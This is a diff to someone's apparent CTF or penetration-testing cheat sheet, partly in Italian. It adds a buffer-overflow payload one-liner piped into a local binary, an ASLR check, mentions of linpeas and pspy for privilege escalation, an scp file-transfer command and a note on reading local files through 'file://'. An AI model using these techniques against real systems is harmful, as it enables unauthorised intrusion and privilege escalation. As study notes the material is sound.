@@ -649,5 +649,19 @@ https://github.com/Ebryx/GitDump
 ###MAGARI USA QUESTA?
 gobuster dir -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt
 
-
+```bash
 (python -c 'print "A" * 40 + "\x00\xc0\xe0\xf7" + "A" * 4 + "\x38\x33\xf5\xf7"'; cat) | ./buff2   
+```
+cat /proc/sys/kernel/randomize_va_space
+
+linepeas.sh
+e 
+psspy (STATIC version)-> to checo cron private job
+
+```bash
+scp -i privkey file user@ip:/home/users.... -> send file through ssh
+```
+
+"file://path" -> protocol to read local files
+
+Pager "less" incovked only if the window is small enough
